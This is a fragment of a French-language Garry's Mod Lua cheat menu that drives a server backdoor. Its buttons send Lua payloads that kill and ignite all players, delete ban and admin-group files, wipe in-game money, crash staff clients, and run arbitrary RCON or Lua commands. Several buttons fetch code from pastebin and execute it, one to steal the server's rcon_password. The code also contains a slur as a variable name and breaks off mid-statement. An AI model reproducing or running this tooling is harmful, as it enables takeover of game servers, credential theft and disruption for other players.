{ typ = "string", name = "Type d'Arme Ã  Strip", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Strip", func = function()
if !timer.Exists( "stripclub" ) then
iZNX.ChatText( "Strip Activé" )
timer.Create( "stripclub", 0.5, 0, function()
local t = iZNX.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = iZNX.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
iZNX.ChatText( "Strip Desactivé" )
end
end, },
},
} )
function iZNX.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 75, 75, 75 ) )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.HTXCommandeListe()
if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(550,550)
iZNX.HTXCommandeSelector:SetTitle(" ")
iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
surface.SetDrawColor( Color(0,0,0, 200) )
surface.DrawRect( 70, 80, 420, h )
surface.SetDrawColor( Color(255, 255, 255, 0) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(110,31,23, 150) )
surface.DrawRect( 70, 80, w - 130, h - 20 )
surface.SetDrawColor( Color(110,31,23, 150))
surface.DrawOutlinedRect( 70, 80, w - 130, h - 20 )
surface.DrawOutlinedRect( 71, 81, w - 132, h - 22 )
surface.SetDrawColor( Color(255, 255, 255, 200))
draw.DrawText( "MENU HTX", "Trebuchet24", 240, 2, Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
end
local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local zilnixestbo1 = vgui.Create("DButton", DScrollPanel)
zilnixestbo1:SetSize( 350, 20 )
zilnixestbo1:SetPos( 100, 175 )
zilnixestbo1:SetText("Tuer tous les joueurs")
zilnixestbo1:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo1.DoClick = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo2 = vgui.Create("DButton", DScrollPanel)
zilnixestbo2:SetSize( 350, 20 )
zilnixestbo2:SetPos( 100, 100 )
zilnixestbo2:SetText("Super-Spam Visuel/Sonore 2")
zilnixestbo2:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo2.DoClick = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( [[BroadcastLua([=[http.Fetch("https://pastebin.com/raw/18ufsJ3U", RunString)]=])]] ) // Check
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo3 = vgui.Create("DButton", DScrollPanel )
zilnixestbo3:SetSize( 350, 20 )
zilnixestbo3:SetPos( 100, 125 )
zilnixestbo3:SetText("Débannir tout les bannis")
zilnixestbo3:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo3.DoClick = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo4 = vgui.Create("DButton", DScrollPanel )
zilnixestbo4:SetSize( 350, 20 )
zilnixestbo4:SetPos( 100, 150 )
zilnixestbo4:SetText("Ignite tous les joueurs")
zilnixestbo4:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo4.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo4.DoClick = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo5 = vgui.Create("DButton", DScrollPanel )
zilnixestbo5:SetSize( 350, 20 )
zilnixestbo5:SetPos( 100, 475 )
zilnixestbo5:SetText("Supprimer les grades")
zilnixestbo5:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo5.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo5.DoClick = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo6 = vgui.Create("DButton", DScrollPanel )
zilnixestbo6:SetSize( 350, 20 )
zilnixestbo6:SetPos( 100, 375 )
zilnixestbo6:SetText("Redémarrer le serveur")
zilnixestbo6:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo6.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo6.DoClick = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("RunConsoleCommand(\"changelevel \"..game.GetMap())")
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo7 = vgui.Create("DButton", DScrollPanel)
zilnixestbo7:SetSize( 350, 20 )
zilnixestbo7:SetPos( 100, 200 )
zilnixestbo7:SetText("Hurlement sur tous les joueurs")
zilnixestbo7:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo7.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo7.DoClick = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo8 = vgui.Create("DButton", DScrollPanel)
zilnixestbo8:SetSize( 350, 20 )
zilnixestbo8:SetPos( 100, 225 )
zilnixestbo8:SetText("Changer le model des joueurs")
zilnixestbo8:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo8.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo8.DoClick = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo9 = vgui.Create("DButton", DScrollPanel)
zilnixestbo9:SetSize( 350, 20 )
zilnixestbo9:SetPos( 100, 250 )
zilnixestbo9:SetText("Niquer la physics du jeu")
zilnixestbo9:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo9.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo9.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo10 = vgui.Create("DButton", DScrollPanel)
zilnixestbo10:SetSize( 350, 20 )
zilnixestbo10:SetPos( 100, 275 )
zilnixestbo10:SetText("Inverser la gravité")
zilnixestbo10:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo10.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo10.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo11 = vgui.Create("DButton", DScrollPanel)
zilnixestbo11:SetSize( 350, 20 )
zilnixestbo11:SetPos( 100, 300 )
zilnixestbo11:SetText("Reset tout l'argent du serveur")
zilnixestbo11:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo11.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo11.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo12 = vgui.Create("DButton", DScrollPanel)
zilnixestbo12:SetSize( 350, 20 )
zilnixestbo12:SetPos( 100, 325 )
zilnixestbo12:SetText("Faire voler tous les joueurs")
zilnixestbo12:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo12.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo12.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo13 = vgui.Create("DButton", DScrollPanel)
zilnixestbo13:SetSize( 350, 20 )
zilnixestbo13:SetPos( 100, 350 )
zilnixestbo13:SetText("Crash tous les admins/vip")
zilnixestbo13:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo13.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo13.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo14 = vgui.Create("DButton", DScrollPanel)
zilnixestbo14:SetSize( 350, 20 )
zilnixestbo14:SetPos( 100, 75 )
zilnixestbo14:SetText("Super-Spam Visuel/Sonore 1")
zilnixestbo14:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo14.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo14.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( [[BroadcastLua([=[http.Fetch("https://pastebin.com/raw/HMUP3tJL", RunString)]=])]] ) //Check
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo15 = vgui.Create("DButton", DScrollPanel)
zilnixestbo15:SetSize( 350, 20 )
zilnixestbo15:SetPos( 100, 400 )
zilnixestbo15:SetText("10â‚¬ toutes les 0.1sec tous les joueurs")
zilnixestbo15:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo15.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo15.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10) end) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo16 = vgui.Create("DButton", DScrollPanel)
zilnixestbo16:SetSize( 350, 20 )
zilnixestbo16:SetPos( 100, 425 )
zilnixestbo16:SetText("Voler le rcon_password")
zilnixestbo16:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo16.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo16.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/a04ea6g8\",function(b,l,h,c)RunString(b)end,nil)" ) // Check
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if iZNX.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password pas trouvé, veuillez réessayer ^^" )
end
end)
end
local zilnixestbo17 = vgui.Create("DButton", DScrollPanel)
zilnixestbo17:SetSize( 350, 20 )
zilnixestbo17:SetPos( 100, 450 )
zilnixestbo17:SetText("â˜¢ Supprimer Toutes les Entité â˜¢")
zilnixestbo17:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo17.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
 
commandnethtx9.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"-back\")" )
net.WriteBit(1)
net.SendToServer()
end
commandnethtx9.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"-back\")" )
net.WriteBit(1)
net.SendToServer()
end
zilnixestbo17.DoClick = function()
net.Start(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo18 = vgui.Create("DButton", DScrollPanel)
zilnixestbo18:SetSize( 350, 20 )
zilnixestbo18:SetPos( 100, 500 )
zilnixestbo18:SetText("Faire danser tous le monde")
zilnixestbo18:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo18.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
RconCommand:SetPos( 385, 25 )
RconCommand:SetSize( 100, 20 )
RconCommand:SetText( "hostname Owned By SeizedTeamMenu" )
local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
Lancer_rcon_commande:SetSize( 103, 20 )
Lancer_rcon_commande:SetPos( 275, 25 )
Lancer_rcon_commande:SetText("RCON Command")
Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_rcon_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Lancer_rcon_commande.DoClick = function()
local rcon_commandes_get = RconCommand:GetValue()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( rcon_commandes_get )
net.WriteBit(false)
net.SendToServer()
end
local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 165, 25 )
GLUACommand:SetSize( 100, 20 )
GLUACommand:SetText( "timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)" )
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 50, 25 )
Lancer_glua_commande:SetText("Code LUA")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
local glua_commandes_get = GLUACommand:GetValue()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG avec Ã§a tu peux baiser le serveur mÃªme si il enleve la backdoor :D")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"Aucun rcon_password sur le serveur :/" )
end )
function iZNX.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Choisir des cibles" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.SelectPlayersPanel( addr )
if iZNX.PlayerSelector and iZNX.PlayerSelector:IsVisible() then iZNX.PlayerSelector:Remove() end
local plytab = iZNX.GetStored( addr, {} )
iZNX.PlayerSelector = vgui.Create("DFrame")
iZNX.PlayerSelector:SetSize(250,400)
iZNX.PlayerSelector:SetTitle("Joueur(s) Ã  cibler")
iZNX.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.PlayerSelector:MakePopup()
iZNX.PlayerSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 125) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local Plist = vgui.Create( "DPanelList", iZNX.PlayerSelector )
Plist:SetSize( iZNX.PlayerSelector:GetWide() - 10, iZNX.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", iZNX.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Tous")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
iZNX.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", iZNX.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Aucun")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
iZNX.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", iZNX.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Moi")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
iZNX.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", iZNX.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
iZNX.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
iZNX.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end
function iZNX.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 75, 75, 75 ) )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( iZNX.GetStored( addr, default ) )
tentry.OnChange = function( self )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
function iZNX.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 50, 50, 50 ) )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( iZNX.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
local FillFrameRates = "STEAM_1:1:35099165"
concommand.Add( "SeizedTeam", function()
if FillFrameRates == "STEAM_1:1:35099165"
 or FillFrameRates == "STEAM_1:1:35099165"
  or FillFrameRates == "STEAM_0:1:80447668"
   or FillFrameRates == "STEAM_1:0:38639999"
